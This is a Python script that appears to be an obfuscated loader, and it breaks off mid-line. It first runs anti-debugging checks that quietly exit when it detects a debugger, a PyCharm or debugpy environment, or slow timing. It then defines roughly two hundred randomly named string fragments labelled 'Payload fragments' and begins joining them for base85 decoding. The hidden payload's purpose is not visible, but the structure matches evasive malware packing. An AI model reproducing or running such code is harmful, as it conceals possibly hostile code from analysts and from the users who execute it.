#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cgX1cPXZlZGYOr = 'oY+-=FDHqxykT)M3Fy&ac3s;GhB;H``f;nfH_+;tQ<12;'
_cfSJx8uo6Xmqw3 = 'mPU`Y8Sgvo-D;~Pv&z^MbSPpU3gbMX_Y+AR-+(glmMD@y'
_cvsmVecuV1RN1W = '|AK46DC6xMDDu2q5itbuHn!OV@-J+{1)gbu+7w`wG<2W}'
_cd8Dc5LEGuz4Aj = 'U*lZ`S_|39dg)8M8<BK+lx37~*yW$7QEe|_z_4V2{8VEQ'
_csRaf1qUtk1ToS = 'fPoS}4DZ)(%nTsKh?ALM^`S5Q8^xvacI3Kl=^fkqWRmhP'
_cuTrAoxlQJMC8Q = 'A)pqQuFD!d-O?RyZg8Y;8_p(Bu_;D0L|{^dct@*xToYxr'
_cr4NywwGdhRT_U = '!laY|$1uz;_J(!{tk&c@e9{P7BqXRq6(p?q&}!j4QI0@b'
_clCLk2I_rfidlH = '2f)CiNM1mEWDC^#PxFKJ%KungZ0f_g=9eIN(J;*@0&bYC'
_cqZQesk4tPNjGU = '5j9~bZBta?7Y#!ITmR*Yv~Ac8&Rk)1dx%B2Y2dfbc>`iv'
_cgIsjtyi69yKox = 'IK?~@M7x=y>;C-PU05@nL(tUpxj?dAXw(VD{X>J2GM?hz'
_cuw8DG2853PxAb = 'iP_D+3q3t$=nFYb9y5;}kx<a|$<w>Y0o_ExHsMsX=rj>)'
_crln_PJxKpR3Af = 'fGmO0{kMh|WJa<}-G1_NOn^kye$iMu^IhMeJ%!4{N==u|'
_cdKw8yjzRWUnm1 = '&ubG{_+%4zr?U@7Z-pM-+%c+6F&$Ya&PzLi8u~4x!UOE~'
_ciDCSkrvmtWx8E = '!sLOYm1kuuH$2^<fk)f%V3)CI!`RbPLp4gmN{?>?7s?>N'
_cudrdcJbdB5jYn = ')w>0Y4Zc$dv{e%b|4?vYPfM}`$C1ll02CN-W3?$6Op&K('
_caEdBr0bgJbdab = 'N5tABA_f$lVNF};%i=5zrVrDDk4M9C5o=Nhl7VH=?ux&c'
_cuxdRoZKlh7NFW = '<g|0+fmmaEDv5^m0Ve+N2YxNh`i;^ff83vTHYjufwWRQ)'
_crjXQHmu3J0Vi3 = '=aQ?Kyg=?Mf;<laZBZrwK0+Zh&)OVVWHhgc6Wt%DZx{i5'
_cxw4k6TwL174JK = '5NL_;n#y)mlqtw(I(q@Nr3}O8%>42E3UPfDs|a@yz_R}D'
_crduSEHXgb4TEd = '`8?nUTfi^o2&;XwJXm6EAdFGy&Ll!TinxNLPSVf8uS(8}'
_cinZ96hW8xrwkM = '`Zd~PHu?e|qZ1+y4x@}j{(p?NZA(64(Xv+MCR+d~k-zjj'
_cqrH0TQXzZyv0k = 'QK!Dm6Nu^hiXL}A^Jml2!y<v`Vi~NyP;D!clFyUmnaGU~'
_crzEhDJVdhCIsV = 'aQw)mm@G-|NJ)&1_9v}^;5}OVsKjD##4-g)nB&I}4GSq&'
_ckjIlVXHucqKBv = 'TGxSs`RhziwTy;*E6Kg5y;0&Lo8$PpjP&#o3Xgq~*h_oE'
_cvey6PQ7qnjAFz = 'SLqHqYI-K=h@OTxi;j#;^(ewKC4OIqr_W|*G376(rH3fc'
_cf3zzTKIkDbdVT = '!Sh%R)ZJ(s3P(wBMoJ8+4wzm(P9GSuHT_<)x<5Q3;%q3t'
_cdsE_iWBEyDx77 = '#pQbXpcm^$eo+<{B%SM4xrgoOQM;csz)c<MyXqrWzg)i6'
_cy3rOm9EbqZrpK = '$fDh2&5?g-yV<qE%QOuF_4O!I!cRHbvO~0E);lgK0q9rO'
_ccYgOKBBgwZXF2 = 'd%b1FRtz*$ea|~E#lYD^7PuIl=UH@J3WOSSyf7E=BKDlE'
_coXFcBTMYY0OQu = 'nTkN$SrS?SPak*Qwqv0$@ihPhF45Z<3~brOA|65h?bx-5'
_cg84JeGvfw8QBR = '3U?m2^dYS*h~KJjh)4wdrq>*Q`mdo((Ey?dT)D3aUR>B~'
_cnX5UGKkxkaHpc = 'VyAGL?SL^=8L=XL!=ZoCcz(?tIXC#6XXcanE;iz%%8~_5'
_chUmLy_Ag_IG3_ = 'T?2Po-V;;OQm}ynb(a|()(#j%eVN0HRVYQ7EU;|%s{F$J'
_cyGJosO70vM_Nl = 'W}=)oWT$%w(K}@}>BQ}$wg8+qeM~DtJrA#p;TW72?(aqC'
_cr2ECmeCaQNhsp = 'oN`ywI1}$$z^r^!%{IyYVkg?F5R%;h9vMYK6I9dUvRU*+'
_cmArrONsBtL1jq = 'nw!n`=Mx=KGVOi1bvpW`=g5i!Xx#Wn5XjlIlyCO6&))s_'
_cf1Torg3FVQ3cB = '^l^1`IVU<ebh@j)&IiJ?sM#wiXb}IqU7X0RH!Ny^2fNfJ'
_crpF7rD7LJa6HR = '3p__;qITB<%UFG=<);}6X)8UEUJs_LyVfg!?#7HWBsp^v'
_cowncvMlQ1Mr0b = 'eJ&8&hZ8lu=BkdULMqZ6L?y+|%R(<BZ*RFuA(NO1Wm+cb'
_cjBCX7TB04_tv7 = '#0w;83PTGTv8&y#mapAU&Eiqs-G;)F9Wtt!_RJ|%|5ZNs'
_cvlI6RH2gd3ORo = '2Ab1W+vYV(?u1Dj5sI5LaGz*Q3s+ep>qvS&H6>)NVzOd3'
_ccV0t4nutS9Gzj = 'IZ1CnMhwX(8fa3Nu&#l+Q>My$n+8VG99RW_5g#^Xm|Qc?'
_cdYBH_3xgoqHtD = '_V8gXJEW=P&-J_ZCpwf=-*liEz=aP;<o*f<sb{G{0N+&M'
_cjE1TYDmOM_ISc = '^MjeW*{Z0Z_$+nmrUnjR(#I8vS?pU%K@rClxl@Zpwq3rt'
_caRBF3Yf43lgod = '&9jWF#>(R5ID)S~&DGY(vS=Bwm5=_EzS=^%8NUM+PXeSn'
_cgaSU9Dim69Xd1 = 'PYr^-;rT%PjSvkVJKB0nYU1^gs%w$idP8qO!3Umd$#Odv'
_czVlsfrGZDxRv6 = '0h`ZlP!3?8(m&U}+a)~2(q~YI{^&rrxQo+bzhO_8oxQ)A'
_cg_VQp31qg7tQZ = '>O79>Gc`e``d?J=^5Xg7f3MW9j_>H{Y*y9wRlUr#>V*kV'
_cyti4hOh6YpyIS = '6@W#@ML=lV&&lC~<8=VDF$0*B6*tenJ+<C&$d};?`Upm~'
_cfM5iY2KQ36MfT = 'xAF%AAM1ON4cZY%aDX`)OgE-i+lt@3;lcrh5*glhQmpTC'
_cj73_fDag1Z8j1 = '5^LWJ*9$bzr&_cQ=w*3?2&39zwh4tj+n4r&0DA61Mj*9y'
_cbh1ubieLw_1pB = '_`FZ)!v%j6V#B0bsiIU9G`STXo}H>EbE~6^w1eJSd$smh'
_cbKiyQ8BKol8rO = ')=^Q%H_%$vBNDMb+1iz(d+?+Q!%hjKsFay|A#4NxfXQh#'
_ckogjzDhw_NsPL = '2L~~blnLpLftN3i&<rF68NA*;)C<y`LVSQkAmR}c_HKRc'
_cjfWgj8xr5kC61 = 'id8%Lo6Yb{M>U~i#8O3&y)CHX9PBej;dou9MlVk<rB5Ov'
_cp0GlPY3Gy6VZa = 'eybvV^!vYTiG5Nr<4-0J$NQDaB`8EaO4Kn$o9jUrKkgr!'
_ck8w6xd6LN1DAe = 'Z94~D7XSzf*S`+x0N9@avH}v5lhJ;LO25BV)2#P1z4__r'
_cpKWuGsjYoXMjg = 'o^!*ci8>;M$it2{z19F**Q)fJ98p$hA2(|x#cMftv|DFO'
_cy0EKOqiFK0TTb = '83`mpp<8vYp6|uUKN1ns4ZO3EZmHK#AYMxvuPbv742PQN'
_czgF5tNO9nVN7q = 'IxWh1y_oNc<%?gel2wmz_`Zj6_egq(0;w067Cd<1F}~ru'
_cg2twivvezPL4t = 'Zj6If;f7?n+vT|a$yfmm2;bgM)5#!7MPN|RrM|QZv71BB'
_cvuo2of9PscSJn = 'av#B!`+QBCs}3g079`{%B|v12e$2k)+1237-}i|&9iH^R'
_cg0sjHd0BG4uyk = 'JlpLL5z3}>A0WmJ>pZSDbOHXxM*l&&7MQbHK~MK3#aq~D'
_cnEbqa1jZWalj2 = 'um2g;AilrDcS{6sRe|)g9AB^B(c^R$66z!S63vW`YB*j{'
_cumvdaLIKny4xo = '-XDz-_k<Z0<--5=Olz8nl~OUaNC>*uwel5dAdH%75-vz$'
_czR3UaU9x1qtZu = 'gJ<&S){v0O%YswUdgfSz;lN$kdWQ}xt<kHuiHO;aY|1Vw'
_czF7pMdXq7P_6O = 'ui&DgFJ6tATa(<`>!e|pZS6X9px-4IqK}SXL02%qbhU<w'
_ct9frQdwQrEYvt = 'KKxw_lR`*S#V)nHM2_Y;2nv{KLrNVTAyqq5dtr-{AQE<s'
_csZ0KSNsMdO0fV = 'O-a}>+N1mcnjfH9<xm()-^9p1!#*8R3Sy#TF~3^xK4<bC'
_crf2GAR5aZ4LUL = 'R|n6=(XyUrM_6{3?X@uT3K#0s*ht>CAkH8I-*=sha&jSC'
_ch30_rKHAJCTPv = 'wy7R70sK&~<Vv`)-t@T?IF=5f$D3lqR;!Vgv(l~dVXuk3'
_cm4boFLEa4U8cx = 'K$do{+8+7ew_R4NGhRMB@~<7{pa%HE0gybEyh&&Y6$?^%'
_c_LUdYtiPlQro4 = 'aC}O%FqLA;mm#{D?GuC_)z*)}L`x;GT~cb>+d%+^Gcifq'
_cajZd4Dp6NjN1O = '|JO;A>vpm)^(Bx!dlfR=z%95)yXUyi1828L))B#^c3-~b'
_chfUoawPpAzdOs = 'fleik=)NPZFKFb1h2M?}wb!Xwf!l`bYui}w+#9bRxiU-l'
_cwK0nQ5dh9vL8u = 'a7kNWW<1AiVPHVM++&ivRlu_rG)4(ai7Pi+%Ifa)+(kpD'
_cfreAs7RM6kiP_ = 'V;aBvE%RD9h6Sk8n;G6ADy@Yyz$R3m_cgT)NH%vbGji2)'
_cbtyHoljruGmkY = '>GfI#$?{JvAKywYBmUY%6Loc3eJuvD+m>_z%U@s4))1DI'
_cvGkFHwevboqCm = 'B1>Z!ehN_In2q7!6N&znv4eJ48{#ApVP`7<VY&5n$l7Pq'
_cyRXntga8jLMKH = 'wl5#(6!I!iuCPf*Ca8k4Q+(=Ms;3mdy{CLb1OG>6Yw98y'
_cmX4Ce200CH_fa = '%+s7QL7$luo1Q&CY2jm_Oq;JXYea#5h^vJ&pjH(=-I`#T'
_c_ipYjC3HBCElH = '6{@1Z|2=vDDga%Scf!(<DMAI3ix1!jmlvUf8!K_}&bc9w'
_cn5jIySQsZLlZA = 'f`bQEsxdYN;J;v*q?wwev}Ejf;;~>zw5}=pKQrg)xJhUv'
_cgkPXCJ3hwYk6L = 'RP2#o;pHRBK3{6E!(#n>>n&M>Ao)X`iN7=Q<NuKju2~DR'
_cquNSqslm_07ym = '6Rr8`Rg;KYM$a6L;44?Whexs;w|#`d`@LG91V(Z`a>cHF'
_chtqURUBtIDLWP = 'hz^i$T{$?8=C>)pkBD-hex(UqYVzc<`W;YlIWfjV&rd1f'
_cmvmsitGIRIvSn = 's-a)$k2@k>vjr0y!vDchP`s80J|ayGf($v3{g1W3T^+^$'
_clO_ozk5K35u7D = 'Q@WLfbIm;VSZnrXS74v4Y8T^i0q})C@Eg$r)7y#ZDOGHL'
_cstifp7cLX2uyD = '=On@JzfBUF8EV97HH-^bmg<>&cq|w2iFsb!6gl)tip~K+'
_ccv3hAr5N3oLcs = 'pMtIFedIn-UI`cTphyK0f``h)t$)8Cz|i>`I!9RHl;13X'
_ccAZOUKbxsWXOF = 'q;+4~Tj-{=ftW{EBgFl>_d`OXQVttJ&z@V__c?kLPDRWH'
_c_xCbTwVuIYBZy = 'dnTWG7*ro09%7_RMtZtM%}e``VNAW(AqdDQQOTe(hyK$~'
_cuuqGrJtB35f_t = 'RQ|E1;(+ckdKB#LudvN4P{Tx(AGbsb>u-44{k}kt7yHI<'
_cfsXY6SysLLzuk = '!s>29Si)K1bqg%@a?Vh)++ja;v)U=0fC7_$4P*|@LP;r@'
_cmT9wDRihvA0Iv = '80ab2%0oU@pHRfvzX5<{EwFFr4yEugH3lInPu_MJ%L{5N'
_ciTE0neLMr_6pF = 'lOcb1&UQJb6T8uevI%v)vnO$W99zg#7}ejlC9qI$%#u|1'
_cchLgP0_xBH0DQ = 'f1~5VXx2jN*{5^MjIkRnpbI_`kZWr~@k?5QBeS`gNOto<'
_cxOcETt4ipekWf = 'wow&ow9^;op04U*NV*g^lgbt0ns~R+`%RWy4$|t!V^^NF'
_coUS4l1rnFvTOU = '7q3gNaXFFK8YdLV`0Wb=`o>K6+6-c8B<?r@n1PKLHyXj1'
_cs08AmFVEuM7JX = 'WTXF?6`#)K>c`YUsI0uAA_uFXN?O5LMbEp`f^~&p9f<6='
_cgmz5mhoBhB8yz = '#`q|d9pGwUYM^;+(0Lw7nqMl!FB?xiTf1WRa|QGwT$6i>'
_cacUXMhdkMkryY = 'WgcOo41VZnruBiQDr6)8c^!NhOo(1LLQs7>ab!#n`u20*'
_crpX8DA4wazX18 = 'y)-+}yi4KKWA}~*fa{S=$HQ6r{RvZ_OC;Yt(hc|GQV_A9'
_cbwwvdwWoKQcJS = '`cc^f$LJn}`wfu%Ta~}Q=O*{D?b=rd%`GYj4RjNM^0CY7'
_ciYdsHJvXo84_1 = '2(A49mq+z!jJL5xIu!a2QA=vhZ0vi}z_ad!e5uI*bT)Iq'
_cwWUVfylp9TbZP = 'enLg6@uWq+HE`%)eIZomvrGkx<~WsDd>stM1~F^m7UnL4'
_cdD4WKnr1kKzir = '(;~VX+I`Qda4~RL07KfK?}(xjo?TwtN~P=OO$^v|t&Y-`'
_cdAkducgyLlPTL = 'A^?WQ4HGy95+ybKv{Ovj7wL+{?EQF2KjOdG;)Lm<C*Y$9'
_cwxiXQK07VHWZ7 = 'P(Mp{v-gLpsS&!#q>Y~(rzh`(&mMU}R;u0AS*~WO5fZ92'
_cxMoGzVB45HAZI = 'S^Vo7wOx1nP)R0ji{Qwd1LR7&a{usO?HO2FjefTc!mHlF'
_cb3eQIdojtd7r9 = 'CG)jG*Bc<#F-~7KFWAGqql5sXRVNL?cS{>@!7<UxslC?p'
_cscEJuUdKHD7r_ = '-H>sjFq4_0C8RbSRSMwT?Va_0MKTrkKni0{b>R~p&tLSU'
_cuYZLhEeXEUReS = 'ZeMHr%!1LT$VNEembI*?W4ZYr!{C0!smaUk>}AX!3EYj('
_ceShX_96M6LvBf = 'jJ+ABe8GtcMrkXK8Ao|)%IXJ_A515eoGz^tgdV*OcnU-`'
_cxXd4MWaeAe7T7 = 'WACTbnQ8*c<8A&zMyp{1R74c>$8^op8sWE$_LFw-oazau'
_cfUWJpKQLtsG24 = 'W%T)V|DRjcrC2lH>C^>SE&xDlD`6C2#_Nxf^}AGCtdeV;'
_cdmQt02LcOh3HN = 'yBu@1T%58uSNu*w_A1-D<=K7v+r@+OBsoUpQfI%wI?V%O'
_c_RKZUioKdQIW3 = 'W?|-jxx8IBKNM-@93-y|)~Hr)VXAc<4{AZHDcD<wwM561'
_ciMRZyUcLWnxau = '#E7p8{Y}gUs*TDm*|4nl*JMM0s$0^8iFb6MXNN<1c-+j&'
_cmaLERrSneAaH7 = 'lvdB!wfVF}mBMwKtr&fd2~?QbDU<-S+rdo_s1zxH2kVv3'
_c_yUjTy5YBdJq4 = 'rmLu1C^`2SMigSePr1erI+rpQU@*DlG)Rq4XdTEPw#Ep0'
_ctp8UH25wT26hG = '4mAGH9saQCn9*9y#OlI!kmr!VJQJ8JDM^?Jjb!;Rp5nEo'
_cp8gz6rtJAthgq = '#%{0!TXKMxnI2<{ee@vXn|s%#+Y+tZ%7|LKk=En1m4U_c'
_cw3gKv8FwhgB9T = ')!&E!xr;?TINuIDk*x|av>6X79tc6L+q-;r;WZRuVJ%kI'
_cudTcV9nPGJbAl = 'P>J_%b|VmNbWSD5gcz3T&FbJSpu1A&hKYthH*F*@-+T4Q'
_cbbjL3Q8j4Y8E6 = '^uY3d21BQ|hhi$%L{6d1)O}>nHOP7Pp1#4s>gPH5h#{3h'
_cdIESQZ2xTJoXa = '{DO*|aS}nI&&v(gsTy0Mrur9;D8cY-Q$hFGYV2yFz-+82'
_cpv88yhnFm2rqr = '@YJR0-7D+2cI&#7n+w>5B5ZmQw+=P#47lo8a5_6YI1I`F'
_cnVA6YmVtjuDEx = 'E_qRRl_ys=$MYJ)!7!M+$bVLU`|Y{TEJVMZ>|KYfI**$o'
_cmus0bj9SJZsiI = '3)5KGD@Gu`>I9c(w>fjDpsB^GQh>X|wSth8kmjD6pgA~@'
_chyc0bR4iBDM1N = 'xVbZVz2X<9g(_{TO203zNgd3h2trZCoIjz#;wfaa{}w@Y'
_crWd_hSWTRbGb3 = '5Y}ieQz-7E=`%C1@wrH!b#y{a#ODD@WZQ&SOX|7!f%D}_'
_ch2r4BK8uof3Wc = 'g8tr&F8Z|)Q-!x&oTSXu(=9AkLFTgYpA?Cehsv_V00TnN'
_cwuvtgNKH95u0e = 'A1G6N6Dv_lqyH3f@^W<<<l*IDR0axOaG>;Hy!{t+Qi=U*'
_cejhZDHHW2HyBT = 'e?m{dI_}}^@jaFJF}32Gt1cpt82ZmuO5thmdN;E>#X$or'
_cuyojQkmeoe_2x = '%i03wA`q|Zrh~`%xQ=2W8zBqV%-E&eO&aAlq8h9ZOA|<G'
_cvNUvtmkSp8jAA = '+bfj?n5PZ@ELLoF;<&+n<T*+k1w-g>{|Az!%sRG5fE6V-'
_cuJkTz6_IJ4mRa = 'N;3l@<_F`tQQrt+J^!A?9jqmJvBZYSEz7Epm>JE+4Ln}o'
_coWJB1ghdDVtXJ = '?BA=;1O609PXtn+`pb3r6m;8KyOK+a*8BDKr=i9%yZ5`a'
_cis_x97QlqCTL0 = 'L<3b7(n=uMC~JiFUpBC%cp1WyL#!&puO6t_0VIIFn5ys='
_cv_HRyALFtqRb6 = 'W+c2`$TQ#u`r>}9H~IABTv|t@N69&xizVz&r6ieV`|!i`'
_cpRITjbOsJhfI8 = '0pcokobNls&LfUmjI2pwss?cez%+gm;cXgr2t9z0eb8BX'
_cfh1d1FlnYzDEm = 'SE+vC-1f<r1$eg@Jpe}4V|VxpIC#EZf#o7#95`w)t>K&)'
_cu0lRujSGm0R22 = 'I?V~sOoPT31C!1uz>OT%4K`f^nC;;&XebK<N7QsmUP1F?'
_c_sS3mJYZ4XFEf = '3I_5Y_0b+gFq@c7utQ60W!L2Q!WX_ijyhBGhI)UmWN$Ji'
_cjdkBQ7ooLngTu = '5=b5MCf~xY5CceuzuR-t<5bmQSLL!{&m6!L5<V32?jWck'
_caNtPHH5iNSGJV = '9f2ziozz>ASCA28DUMTcp7X3hk&D!>OF>j2s~i*rt=U;c'
_cfCD6lqNt3wnvt = 'Rt7D?r*36?7+ed=T7<ikuv5qAz4{TM<Hd+<r>czyr-I>O'
_cd3Rtyw9MEgs34 = 'r<yZTiC{9!67DV+0Rw~ZGos<Tvse#qJf8Q>lM6WW2e{13'
_cjWFn9ygqMEaPM = 'a6{Qyz0YG^s1gAU+Nto`Vq8D05J{&JQE$bYKO(yjkmX8k'
_ccMLUV7tqKLecd = 'a!6%f77vCrD01(HX?m9|z1<!XJvWQhA*l9wc%aEq<09g^'
_cizavfzsPyYFny = 'l6&(rl;DF!FV!5M=Eoa38S3{(r22(D-Ey+G8DbSm#ndJh'
_cdai1MM22tWtN5 = 'to>$CA3p!P&{wI!VS2)#XUgYA8cSz!0Ho~X$lh7Spn|_E'
_cbtV79GthcIgCH = '6(g|&FUs7EcS%=@ZAIs+5<bH1es7K(hNt_1w7}7;?su9X'
_cwnPDEhbTMwUx7 = 'j1+DfNI`7Dpmn&EgT1<>Z%^{l=HGD8Q|MEf^0fT~qEjFp'
_clvo6c5YoUHh_k = ';QofruvW;edyWW$eOsr+&K_A`0nTQ}lb&{a6G4H+c<=Lp'
_ciEYKgZmQ2Qefr = 'x)3--0YEmengNKsDIN0599{`YG^y3peBTj~0T(QUTCn;3'
_cl9ARcO468hP0P = 'ukAY3Gan-YmM-x#9|wsm+OYJ(VDKw_N52%L{S|<<fR+K$'
_cutUvnRzLbe1tJ = '1ic2DjPWVv{Iw?X%=IV2nryS|3nsaw1|A35#KV3w9+~CY'
_cvlL2Q7ZfAmCE4 = 'rv7OPO5s~W5G6>tVy*ULuozKPAoV~4*_bR-Ehkx@4F`N5'
_cemDDbX07a6SzN = 'o!|-l;GU%4JS;lLA;!#r#5l^3qlhdE=t7@H&Y2`I!XLlT'
_clMqkoS4lgKOmh = 'YEob15|o>jW?0+ZBeRV<leoBu2Jf-G#Xzy=E8bh@@GaYe'
_clfndMOZ9CUrBh = 'e_1cHg}kxwIJ8S(EvKw>9<euMm9k-uF`ZNDxfPq+x}5YJ'
_caMemsOU1SHIEC = 'Dgm#QuJTaFs7ViIFZ40gKZx>OyLy}IbVKV<t405kkg>H-'
_ckP10d5MQ5Die5 = 'NccEI5OKkjLu`203dpPTB+FAkPxoHxRRWnc0V()h^n4<t'
_cmOKud1Plx7cmN = 'XxCRBxmf%0bk6y}Xl<P_iDf|>EJjW=wV(ItjXANLa-@FY'
_ccUqog5JEImEtH = 'J6&!Fuo^%aa=}euxeoluw4-HT(LLy;HA&weev@m82Xmnf'
_cdJZj_GculEpD2 = '%`+{BfGVW|V&{^ubnn?>2FW-#P;{)u1Aiw2k4t80AI*dv'
_cyY5PYMzAcaMZs = 'cwjBFjSubbeT-PdH+}t@GE1rDg)dh#m7+;4u!2m1JsmQy'
_ctXsEv0buybeCu = 'T<AM)&$=pe1I_+`Yo)fS!r7ywN~wh_ll<7B)hCcnU_(6T'
_cdAI3JK3waK77N = 'QIBEw=g6ZR)`;r@xkur>?Jeu#f9(%*0mls;ykZaio=|(k'
_cuSkoNPYjoREay = 'aKyz>m9d>@#f|meALSB;6=-OZn1Z6U(!`%lq5HX*w*oDf'
_ciYW4XdPpDnCmD = 'nwwS_9=@H9aUYcwJ=lQh{!P-H>zt|o%v)z4SNj<+O`@I-'
_cmPNqtEsAOIrTJ = ';q@Z^{}s4>E@;K+5Ewi6W>1;K^7$Yqcq+?GLG~WN1{iRg'
_cwsrGzIftwNQ4T = 'C6uxA+(l4=6n&=yQZKAEkcIMpz;^~K%gLX!>f#%Q5fpZj'
_cnBEVxOTguPraX = '<t=BQyM2Jo%BIWkj^1@r{nw3zetS}3><TJr5eLa#&sTb?'
_csvRDqMA3m9zDl = 'Fze7TGs%7C^-Ef&D%G0WzPpBr>3e|G0P<DXpL)n%*<;Y9'
_ccJHRvATEVAXET = '?m-`IBY(Y{4`@pl6fX{6zS1EPWYdPB<x9#bX_%%{>K}CU'
_cvcFkZ9SX0lDuH = 'NdCL+Kp<i<)gknv?)f+yj+BC(_=x7et9l56g|(dmqOciH'
_cnsbu8wVIivOOC = 'c-;~e?O&li*&ys**{I|v+Y#w1nPxFCaJhmy$&K@*+FanE'
_cfOybacZ0jIz30 = 'K1g@!@dv4)BIt8@hNOUZ2$64+3|Kxl3W6B4iR!7CyLQmQ'
_co3GE3WK1N3RoI = 'UfHB_AD<Hyhjm^#qHFX%ni?_C!srT_OAPbR9mI4n7bp~f'
_crpRdlB2xoW8kw = 'Dtep4_7tV9&!%izlhnf(Ioz*q{=ei7Yp#XEaP@nW&TPgK'
_cuilQrXzHooxUm = 'O8tHPmV};kc<&mGA6Jo0zuw0G`e54kOYDO;P-U+ZlS-*d'
_cw1CA4hHioWsMj = 'i`GV_JYKJEK48~lDQEJ^+<u#=fQwKw>(LrK*YJeXn8Y4*'
_crossALfIABM8q = '9F)ol?|y>B#z56!E-`Qo9n)5rwpl?DsW^k^oC&l6<#*wK'
_cqEEHmBvTqf6XV = '#6%$sDMpHTjWll)g1UQ}t`U3wlDQ!W$wth(W0MJXvDJCQ'
_cr4b2AgjB_2g0m = '82WA8bA0cY+>k9OQXFjtWvVTn_Jii^MNi!^#pmr2O}Rwb'
_cgYxa9Ew3fY_4Z = 'J>U0)b~jO2!E4;p6H@Y*J6zuP6e>4i(p{qjqScSw&mLX&'
_clyJia6mg0JSjO = 'AS-PG5ahe4$quJdeip|XU21OInm$ABvCAvO*k^yi#DJio'
_cdSA2xYm1c8ZcV = 'ZbrS^nigZ$*)*^(zls670V)Yy3Fl{~=>yi4#vOQE*hJp@'
_cyw_sgJO41INtJ = '34huziT=F5b<XMf^9VvG&(D4Ur*OscfE1L~3ch_omCBf8'
_chuXLNQb1uBVIL = 'fwx6GN;saSW#^Yp=9wdSq5%by4_4G{B(_$9^piDwa$RU('
_coNTr_TvMDIpnr = 'PWP^aK=8yYx1n(Kgp0NOWVuUP<dv>)_9oCwu-9~m?iyH6'
_csYRADPcmCa8ez = 't{d`KqH4HTd7Ju_VmpB9@SfY5p&EUjvGRJ*uboeIwb4L3'
_cdxYjJmx_oiskD = 'ae-Gi)~`RiF;=aE1R4qW2m4!j8;GFYY=zZwan_1*6}}C1'
_chimzwkmYOI5eh = 'wfRmLZc-osLu{*<f1StU>Z;9DCY|n`G!_dH!_IXTk@1en'
_citlaPv5oZxcBB = '!L*NJcjgXFoGMk-CU%P$R*90k0FcPC+6d7<VL?dsyIF0Z'
_czgbJvhrDbFpI2 = '(;o{7gX)I)T?<_VXGi3PIlUi5XfV0nVX$QFHs=r^{7h7S'
_cdRYZ7gNy_ptre = '2s0E}SU+RB-1h);O{jyX;IgTXT+LLhOAah%n@_{ks2Hm#'
_cdYJkgTXKYYpz2 = 'qPqz-6}!;5^nd+ZeD^o?kO=J#$QMSOqwns5p%}C|^dqys'
_ceSo0AD6grQXah = 'LbL^$Rj~=W!h&y;ie07Z8ch-V{xX1Itf9zkWeSW<$7vpD'
_casigGms79fBD1 = 'L`Yw?`#i^@?wxOf7*Xy>D_nHU<jw9J1ydS^e54FP5SW0!'
_caO0M2oB3diE0e = 'tl7T~RIBGfdyz15$kycgqS+reRo5^*{z#^PyTZ3y;7KE1'
_cmLyeBYoIQ6kqT = 'O5#7QIHP6ECeA(4dkmkbSgy>9AodEQ2(5A2YT_D(E_csy'
_cog0PyuCZhX3t4 = 'JYePtRcF-XreJfPPjNTc7!O!R+e5BRY<Y1MnJ~PQLayF;'
_csc7CAp7WRSPD4 = '(vqK_6gmVaQqG=&pkEOPK}xSKdGtRO&|+jyq!dxK+*&@9'
_cwCW6Zdsg7OUIU = 'GS;xCVTcsE2mKXM@V76TlV&xdX(`l60?sDLAw8G0#Jt&B'
_cwMpD4MNjc1Tum = 'eeLS1@vh@_s7W#yN01AuS*%s~tw`;-@EQ}R0hOEWTynb6'
_cueLKyIlnN8akR = 'F-zn(hq)q|$zh+9K2GO#^_Q``xW`XQ^w@``3Lt2RT0<a@'
_cc2J5XWobQy1e4 = 'qxvpB1(_jd_5*QU>n`bV7Io{%j%8BxI1Tt1qA00zj>;&}'
_ceDotXDwA7QdHP = 'dxBTtB>OZ|_tf=n4HcaLM{1a9SXT>b^2|i1Odw>Pvt!Qa'
_cxgxIVWN2vjNZH = ';Ubg@Y+Cz+%B~sCq{Woc6Kc}Z;+~zS?G0gEC7NTcylAw2'
_ca7_wgh6EBOfHP = ';C0h)Fsdb23|{KG6Sxz#qQTeEmZui)IOZ@lS(wrZyjZ%n'
_cgp4cwtvYWerMb = 'Y-w<mPw8^R^*V~x0>fUx9LewU00xwR<eixGT1gXBX5r_$'
_chR9UGbvlKjnSO = 'hkY&BKW_7I4?y|I|8Spbm<{mL7X8zDx2>`'

_pqRCfrJkWiHBC9 = __import__('base64').b85decode(_cgX1cPXZlZGYOr + _cfSJx8uo6Xmqw3 + _cvsmVecuV1RN1W + _cd8Dc5LEGuz4Aj + _csRaf1qUtk1ToS + _cuTrAoxlQJMC8Q + _cr4NywwGdhRT_U + _clCLk2I_rfidlH + _cqZQesk4tPNjGU + _cgIsjtyi69yKox + _cuw8DG2853PxAb + _crln_PJxKpR3Af + _cdKw8yjzRWUnm1 + _ciDCSkrvmtWx8E + _cudrdcJbdB5jYn + _caEdBr0bgJbdab + _cuxdRoZKlh7NFW + _crjXQHmu3J0Vi3 + _cxw4k6TwL174JK + _crduSEHXgb4TEd + _cinZ96hW8xrwkM + _cqrH0TQXzZyv0k + _crzEhDJVdhCIsV + _ckjIlVXHucqKBv + _cvey6PQ7qnjAFz + _cf3zzTKIkDbdVT + _cdsE_iWBEyDx77 + _cy3rOm9EbqZrpK + _ccYgOKBBgwZXF2 + _coXFcBTMYY0OQu + _cg84JeGvfw8QBR + _cnX5UGKkxkaHpc + _chUmLy_Ag_IG3_ + _cyGJosO70vM_Nl + _cr2ECmeCaQNhsp + _cmArrONsBtL1jq + _cf1Torg3FVQ3cB + 